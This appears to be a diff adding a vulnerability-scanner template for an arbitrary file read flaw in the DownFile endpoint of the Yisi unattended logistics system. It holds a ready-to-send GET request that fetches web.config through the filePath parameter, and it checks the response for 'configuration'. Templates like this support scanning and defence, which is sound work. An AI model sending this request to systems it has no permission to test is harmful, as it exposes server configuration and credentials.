@@ -1,0 +1,18 @@
+id:
+info:
+  name: 易思无人值守智能物流系统 DownFile 任意文件读取漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /PublicInfoManage/Upload/DownFile?filePath=web.config
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+    Connection: close
+response1:
+  body: configuration
+requests2:
+response2:
